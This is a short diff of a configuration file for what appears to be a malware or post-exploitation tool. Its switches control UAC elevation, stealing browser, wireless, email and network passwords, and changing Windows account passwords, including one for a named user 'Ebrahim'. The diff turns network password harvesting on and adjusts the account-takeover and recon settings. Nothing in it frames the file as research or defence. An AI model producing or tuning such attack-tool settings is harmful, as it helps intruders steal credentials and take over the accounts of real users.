@@ -1,5 +1,3 @@
-# Reference in the "cheat sheat.rtf" file
-
 # ->initializing controls
 exec_mode = "normal"
 uac_elevation = 1
@@ -25,21 +23,21 @@ browser_pwds = 0
 wireless_keys = 0
 email_pst_pwds = 0
 mail_pwds = 0
-network_pwds = 0
+network_pwds = 1
 msn_pwds = 0
 dialup_pwds = 0
 
 # ->password moding
 change_nt_pwd = {
     'current_acc_controller': 0,
-    'current_acc_pwd': "new password",
+    'current_acc_pwd': "",
     'diff_acc_controller': 0,
     'diff_acc_usr': "Ebrahim",
     'diff_acc_pwd': "a password"
 }
 
 # ->recon
-batch_info = 1
+batch_info = 0
 network_scan = 0
 
 # ->network based executions
